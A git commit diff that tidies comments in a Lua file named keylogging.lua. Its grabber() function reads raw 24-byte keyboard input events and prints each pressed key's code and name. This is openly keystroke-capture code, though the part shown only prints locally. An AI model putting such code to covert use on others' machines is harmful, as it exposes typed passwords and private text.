194f0eb08714c5702dbebbd21efb061fd2b21065
Chris <anfractuosity@anfractuosity.com>
2014-10-20 19:46:17 +0200

    remove comments

--- src/keylogging.lua
+++ src/keylogging.lua
@@ -32,27 +32,19 @@ function grabber()
 	
 	go = true
 	while go do
-
 		all = file:read(24)
-		--[[time  =  file:read(16)
-		ktype = file:read(2)
-		kcode = file:read(2)
-		value = file:read(4)]]--
 
 		time = string.sub(all,1,16)
 		ktype = string.sub(all,17,18)
 		kcode = string.sub(all,19,20)
 		value = string.sub(all,21,24)
 
-
-		--print(#time,#ktype,#kcode,#value)
 		ktype = conv(ktype)
 		kcode = conv(kcode)
 		value = conv(value)
 		
-		--print(ktype,kcode,value)
 		if (value == 1 or value == 2) then
-			print("KEY ",value,"   ",key[kcode])
+			print("KEY ",kcode,"   ",key[kcode])
 		end
 	end
 end
